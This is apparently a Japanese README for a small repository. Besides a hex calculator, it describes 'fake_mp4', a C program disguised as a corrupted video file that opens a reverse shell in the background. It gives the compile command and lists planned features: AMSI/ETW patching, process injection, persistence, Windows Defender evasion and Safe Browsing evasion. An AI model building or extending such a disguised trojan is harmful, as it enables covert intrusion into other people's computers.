# hex_dealer.py
16進数の変換と計算を行う簡易的なプログラム。

# fake_mp4
動画ファイルを装い、バックグラウンドではリバースシェル接続を行うC製のプログラム。
## Step1
実行時に動画ファイルが破損しているメッセージを表示し、バックグラウンドでリバースシェル接続を行う。
```powershell
gcc -o step1 fake_mp4\step1.c -lws2_32 -mwindows
```
## Step2
AMSIとETWをパッチする機能を追加する。
## Step3
自身のプロセスを起動後、プロセスインジェクションでプログラムを実行する。
## Step4
永続化を図る。
## Step5
Windows Defenderを回避する。
## Step6
ブラウザのセーフブラウジングを回避する。
